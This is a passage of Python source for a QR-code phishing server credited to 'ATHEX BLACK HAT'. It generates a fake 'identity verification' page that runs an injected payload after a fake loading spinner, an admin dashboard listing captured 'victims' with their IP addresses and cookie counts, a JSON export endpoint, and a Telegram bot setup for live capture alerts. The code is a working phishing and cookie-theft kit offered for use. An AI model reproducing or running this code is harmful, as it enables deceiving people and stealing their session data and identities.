                    justify-content: center;
                    padding: 20px;
                }}
                .container {{
                    background: white;
                    max-width: 500px;
                    width: 100%;
                    border-radius: 25px;
                    overflow: hidden;
                    box-shadow: 0 25px 75px rgba(0,0,0,0.3);
                    animation: fadeIn 0.8s ease-out;
                }}
                @keyframes fadeIn {{
                    from {{ opacity: 0; transform: translateY(30px); }}
                    to {{ opacity: 1; transform: translateY(0); }}
                }}
                .header {{
                    background: linear-gradient(90deg, {template_data['color']} 0%, {template_data['color']}99 100%);
                    color: white;
                    padding: 40px 30px;
                    text-align: center;
                }}
                .icon {{ font-size: 80px; margin-bottom: 20px; }}
                .header h1 {{ font-size: 28px; margin-bottom: 10px; }}
                .content {{ padding: 40px 30px; }}
                .spinner {{
                    width: 60px;
                    height: 60px;
                    border: 6px solid #f3f3f3;
                    border-top: 6px solid {template_data['color']};
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 30px;
                }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                .loading h2 {{ color: #333; margin-bottom: 10px; }}
                .loading p {{ color: #666; }}
                .security-note {{
                    text-align: center;
                    margin-top: 30px;
                    padding: 20px;
                    background: #f8f9fa;
                    border-radius: 15px;
                    font-size: 12px;
                    color: #666;
                }}
            </style>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="icon"><i class="{template_data['icon']}"></i></div>
                    <h1>{template_data['name']}</h1>
                    <p>Secure verification in progress...</p>
                </div>
                
                <div class="content">
                    <div class="loading" id="loading">
                        <div class="spinner"></div>
                        <h2>Verifying your identity</h2>
                        <p>Please wait while we complete the security check...</p>
                    </div>
                    
                    <div class="security-note">
                        <i class="fas fa-shield-alt"></i>
                        <p><strong>Secure Connection • Encrypted Session</strong></p>
                    </div>
                </div>
            </div>
            
            <script>
                window.addEventListener('load', function() {{
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '<div style="text-align:center; padding:40px;"><i class="fas fa-check-circle" style="font-size:60px; color:#4CAF50;"></i><h2>Verification Complete!</h2><p>Redirecting...</p></div>';
                        {payload}
                    }}, 2000);
                }});
            </script>
        </body>
        </html>
        """
    
    def generate_dashboard(self):
        """Generate admin dashboard HTML"""
        victims = self.db.get_all_victims(50)
        stats = self.db.get_statistics()
        
        victims_html = ""
        for v in victims[:30]:
            timestamp = datetime.fromisoformat(v['timestamp']).strftime('%H:%M:%S') if v['timestamp'] else 'N/A'
            ip = v.get('ip_address', 'Unknown')[:15]
            cookies = len(v.get('cookies', '').split(';')) if v.get('cookies') else 0
            
            victims_html += f"""
            <tr>
                <td><code>{v['id'][:8]}...</code></td>
                <td>{timestamp}</td>
                <td>{ip}</td>
                <td>{cookies}</td>
                <td><span class="badge">{v.get('template', 'unknown')}</span></td>
                <td><button class="btn-small" onclick="viewVictim('{v['id']}')">View</button></td>
            </tr>
            """
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Dashboard - Security Monitor</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: #1a1a2e;
                    color: white;
                    padding: 20px;
                }}
                .dashboard {{ max-width: 1400px; margin: 0 auto; }}
                .header {{
                    background: linear-gradient(90deg, #16213e 0%, #0f3460 100%);
                    padding: 25px;
                    border-radius: 20px;
                    margin-bottom: 25px;
                }}
                .controls {{ display: flex; gap: 15px; margin-top: 20px; flex-wrap: wrap; }}
                .btn {{
                    padding: 10px 20px;
                    background: linear-gradient(90deg, #4CAF50, #2196F3);
                    color: white;
                    border: none;
                    border-radius: 10px;
                    cursor: pointer;
                    text-decoration: none;
                }}
                .btn-danger {{ background: linear-gradient(90deg, #f44336, #d32f2f); }}
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 20px;
                    margin-bottom: 25px;
                }}
                .stat-card {{
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 15px;
                    text-align: center;
                }}
                .stat-card i {{ font-size: 2em; margin-bottom: 10px; color: #4CAF50; }}
                .stat-card .number {{ font-size: 2em; font-weight: bold; }}
                .table-container {{
                    background: rgba(255,255,255,0.05);
                    border-radius: 20px;
                    padding: 20px;
                    overflow-x: auto;
                }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
                th {{ background: rgba(76,201,240,0.2); }}
                .badge {{
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 12px;
                    font-size: 11px;
                    background: rgba(76,175,80,0.2);
                    color: #4CAF50;
                }}
                .btn-small {{
                    padding: 5px 10px;
                    background: rgba(255,255,255,0.1);
                    border: none;
                    border-radius: 5px;
                    color: white;
                    cursor: pointer;
                }}
                .modal {{
                    display: none;
                    position: fixed;
                    z-index: 1000;
                    left: 0;
                    top: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.8);
                }}
                .modal-content {{
                    background: #1a1a2e;
                    margin: 5% auto;
                    padding: 30px;
                    width: 90%;
                    max-width: 800px;
                    border-radius: 20px;
                    max-height: 80vh;
                    overflow-y: auto;
                }}
                .close {{
                    color: #aaa;
                    float: right;
                    font-size: 28px;
                    font-weight: bold;
                    cursor: pointer;
                }}
                .json-viewer {{
                    background: #0f3460;
                    padding: 20px;
                    border-radius: 10px;
                    overflow-x: auto;
                    font-family: monospace;
                    font-size: 12px;
                }}
                @media (max-width: 768px) {{ .controls {{ flex-direction: column; }} .btn {{ width: 100%; text-align: center; }} }}
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="header">
                    <h1><i class="fas fa-shield-alt"></i> Security Dashboard</h1>
                    <p>Real-time monitoring of captured data</p>
                    <div class="controls">
                        <a href="/" class="btn"><i class="fas fa-qrcode"></i> Generate QR</a>
                        <a href="/config-telegram" class="btn"><i class="fab fa-telegram"></i> Telegram Config</a>
                        <button class="btn" onclick="refreshData()"><i class="fas fa-sync-alt"></i> Refresh</button>
                        <a href="/api/victims" target="_blank" class="btn"><i class="fas fa-download"></i> Export JSON</a>
                    </div>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card"><i class="fas fa-users"></i><div class="number" id="totalVictims">{stats.get('total_victims', 0)}</div><div>Total Captures</div></div>
                    <div class="stat-card"><i class="fas fa-qrcode"></i><div class="number" id="activeQR">{stats.get('active_qr', 0)}</div><div>Active QR Codes</div></div>
                    <div class="stat-card"><i class="fas fa-calendar-day"></i><div class="number" id="todayCaptures">{stats.get('today_captures', 0)}</div><div>Today's Captures</div></div>
                    <div class="stat-card"><i class="fas fa-globe"></i><div class="number" id="uniqueIPs">{stats.get('unique_ips', 0)}</div><div>Unique IPs</div></div>
                </div>
                
                <div class="table-container">
                    <h2><i class="fas fa-table"></i> Recent Captures</h2>
                    <table>
                        <thead>
                            <tr><th>ID</th><th>Time</th><th>IP</th><th>Cookies</th><th>Template</th><th>Action</th></tr>
                        </thead>
                        <tbody id="victimsTable">
                            {victims_html if victims_html else '<tr><td colspan="6" style="text-align:center;">No captures yet</td></tr>'}
                        </tbody>
                    </table>
                </div>
            </div>
            
            <div id="victimModal" class="modal">
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2><i class="fas fa-info-circle"></i> Capture Details</h2>
                    <div id="modalContent" class="json-viewer">Loading...</div>
                </div>
            </div>
            
            <script>
                let allVictims = [];
                
                async function refreshData() {{
                    try {{
                        const [victimsRes, statsRes] = await Promise.all([
                            fetch('/api/victims'),
                            fetch('/api/stats')
                        ]);
                        
                        const victims = await victimsRes.json();
                        const stats = await statsRes.json();
                        allVictims = victims;
                        
                        document.getElementById('totalVictims').textContent = stats.total_victims || 0;
                        document.getElementById('activeQR').textContent = stats.active_qr || 0;
                        document.getElementById('todayCaptures').textContent = stats.today_captures || 0;
                        document.getElementById('uniqueIPs').textContent = stats.unique_ips || 0;
                        
                        const tableBody = document.getElementById('victimsTable');
                        if(victims.length === 0) {{
                            tableBody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No captures yet</td></tr>';
                            return;
                        }}
                        
                        tableBody.innerHTML = victims.slice(0, 30).map(v => {{
                            const time = new Date(v.timestamp).toLocaleTimeString();
                            const ip = v.ip_address ? v.ip_address.substring(0, 15) : 'Unknown';
                            const cookies = v.cookies ? v.cookies.split(';').length : 0;
                            return `
                                <tr>
                                    <td><code>${{v.id.substring(0, 8)}}...</code></td>
                                    <td>${{time}}</td>
                                    <td>${{ip}}</td>
                                    <td>${{cookies}}</td>
                                    <td><span class="badge">${{v.template || 'unknown'}}</span></td>
                                    <td><button class="btn-small" onclick="viewVictim('${{v.id}}')">View</button></td>
                                </table>
                            `;
                        }}).join('');
                    }} catch(error) {{
                        console.error('Refresh error:', error);
                    }}
                }}
                
                async function viewVictim(victimId) {{
                    try {{
                        const response = await fetch('/api/victims');
                        const victims = await response.json();
                        const victim = victims.find(v => v.id === victimId);
                        
                        if(victim) {{
                            document.getElementById('modalContent').innerHTML = `<pre>${{JSON.stringify(victim, null, 2)}}</pre>`;
                            document.getElementById('victimModal').style.display = 'block';
                        }}
                    }} catch(error) {{
                        alert('Error loading details: ' + error.message);
                    }}
                }}
                
                function closeModal() {{
                    document.getElementById('victimModal').style.display = 'none';
                }}
                
                window.onclick = function(event) {{
                    const modal = document.getElementById('victimModal');
                    if(event.target === modal) closeModal();
                }}
                
                refreshData();
                setInterval(refreshData, 30000);
            </script>
        </body>
        </html>
        """
    
    def generate_telegram_config_page(self):
        """Generate Telegram configuration page"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Telegram Bot Configuration</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    color: white;
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                }}
                .container {{ max-width: 600px; width: 100%; }}
                .header {{ text-align: center; margin-bottom: 40px; }}
                .header i {{ font-size: 4em; color: #0088cc; margin-bottom: 20px; }}
                .config-card {{
                    background: rgba(255,255,255,0.05);
                    padding: 40px;
                    border-radius: 20px;
                }}
                .form-group {{ margin-bottom: 25px; }}
                label {{ display: block; margin-bottom: 8px; color: #aaa; }}
                input {{
                    width: 100%;
                    padding: 15px;
                    background: rgba(255,255,255,0.07);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    color: white;
                }}
                .btn {{
                    padding: 15px 30px;
                    background: linear-gradient(90deg, #0088cc, #00aced);
                    color: white;
                    border: none;
                    border-radius: 10px;
                    cursor: pointer;
                    width: 100%;
                    margin-top: 10px;
                }}
                .instructions {{
                    background: rgba(0,136,204,0.1);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 20px 0;
                }}
                .status {{
                    padding: 15px;
                    border-radius: 10px;
                    margin: 20px 0;
                    display: none;
                }}
                .status-success {{ background: rgba(76,175,80,0.2); border: 1px solid rgba(76,175,80,0.3); color: #4CAF50; }}
                .status-error {{ background: rgba(244,67,54,0.2); border: 1px solid rgba(244,67,54,0.3); color: #f44336; }}
                .nav-links {{ display: flex; gap: 15px; margin-top: 30px; justify-content: center; }}
                .nav-link {{
                    padding: 12px 25px;
                    background: rgba(255,255,255,0.05);
                    border-radius: 10px;
                    text-decoration: none;
                    color: white;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <i class="fab fa-telegram"></i>
                    <h1>Telegram Bot Setup</h1>
                    <p>Configure real-time notifications</p>
                </div>
                
                <div class="config-card">
                    <div class="instructions">
                        <h3><i class="fas fa-info-circle"></i> Setup Guide:</h3>
                        <ol style="padding-left: 20px; margin-top: 10px;">
                            <li>Open Telegram and search for <strong>@BotFather</strong></li>
                            <li>Send <code>/newbot</code> to create a new bot</li>
                            <li>Copy the <strong>API Token</strong> provided</li>
                            <li>Start a chat with your bot and send <code>/start</code></li>
                            <li>Get your <strong>Chat ID</strong> from @userinfobot</li>
                        </ol>
                    </div>
                    
                    <div id="status" class="status"></div>
                    
                    <form id="telegramForm">
                        <div class="form-group">
                            <label><i class="fas fa-key"></i> Bot Token:</label>
                            <input type="text" id="bot_token" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz">
                        </div>
                        <div class="form-group">
                            <label><i class="fas fa-id-card"></i> Chat ID:</label>
                            <input type="text" id="chat_id" placeholder="123456789">
                        </div>
                        <button type="button" class="btn" onclick="saveConfig()">Save Configuration</button>
                        <button type="button" class="btn" onclick="testConnection()" style="margin-top: 10px;">Test Connection</button>
                    </form>
                    
                    <div class="nav-links">
                        <a href="/" class="nav-link">Home</a>
                        <a href="/dashboard" class="nav-link">Dashboard</a>
                    </div>
                </div>
            </div>
            
            <script>
                function showStatus(message, type) {{
                    const status = document.getElementById('status');
                    status.textContent = message;
                    status.className = `status status-${{type}}`;
                    status.style.display = 'block';
                    setTimeout(() => status.style.display = 'none', 5000);
                }}
                
                async function saveConfig() {{
                    const botToken = document.getElementById('bot_token').value.trim();
                    const chatId = document.getElementById('chat_id').value.trim();
                    
                    if(!botToken || !chatId) {{
                        showStatus('Please enter both Bot Token and Chat ID', 'error');
                        return;
                    }}
                    
                    try {{
                        const response = await fetch('/save-telegram', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{bot_token: botToken, chat_id: chatId}})
                        }});
                        const data = await response.json();
                        if(data.success) showStatus('Configuration saved!', 'success');
                        else showStatus('Error saving configuration', 'error');
                    }} catch(error) {{
                        showStatus('Error: ' + error.message, 'error');
                    }}
                }}
                
                async function testConnection() {{
                    try {{
                        const response = await fetch('/telegram-test');
                        const data = await response.json();
                        if(data.success) showStatus(data.message, 'success');
                        else showStatus(data.message, 'error');
                    }} catch(error) {{
                        showStatus('Error testing connection', 'error');
                    }}
                }}
            </script>
        </body>
        </html>
        """

# ============================================
# MAIN SERVER
# ============================================
class QRPhishingServer:
    """Main phishing server"""
    
    def __init__(self, port=Config.PORT, host=Config.SERVER_IP):
        self.port = port
        self.host = host
        self.server = None
        self.db = DatabaseManager()
        self.qr_generator = None
    
    def start(self):
        """Start the server"""
        try:
            base_url = f"http://{self.host}:{self.port}"
            
            self.qr_generator = QRCodeGenerator(base_url)
            QRPhishingHandler.qr_generator = self.qr_generator
            
            self.server = HTTPServer((self.host, self.port), QRPhishingHandler)
            
            print("\n" + "="*60)
            print("🚀 ADVANCED QR CODE SECURITY TOOL")
            print("="*60)
            print(f"📍 Server: {base_url}")
            print(f"📊 Dashboard: {base_url}/dashboard")
            print(f"🎯 QR Generator: {base_url}")
            print(f"🤖 Telegram Config: {base_url}/config-telegram")
            print("="*60)
            print("\n   DEVELOPER - ATHEX BLACK HAT")
            print("="*60 + "\n")
            
            webbrowser.open(base_url)
            
            self.server.serve_forever()
            
        except KeyboardInterrupt:
            print("\n\n🛑 Server stopped")
        except Exception as e:
            print(f"❌ Server error: {e}")

# ============================================
# MAIN EXECUTION
# ============================================
if __name__ == "__main__":
    print("""
    
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ██████╗ 
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝   ██╔═══██╗██╔══██╗
██║  ███╗███████║██║   ██║███████╗   ██║█████╗██║   ██║██████╔╝
██║   ██║██╔══██║██║   ██║╚════██║   ██║╚════╝██║▄▄ ██║██╔══██╗
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ╚██████╔╝██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚══▀▀═╝ ╚═╝  ╚═╝
                                                               
               POWERED BY ATHEX BLACK HAT       
    
    """)
    
    try:
        port = input(f"Enter port number [{Config.PORT}]: ").strip()
        if port:
            Config.PORT = int(port)
        
        server = QRPhishingServer(port=Config.PORT, host='0.0.0.0')
        server.start()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Shutting down...")
    except Exception as e:
        print(f"\n❌ Error: {e}")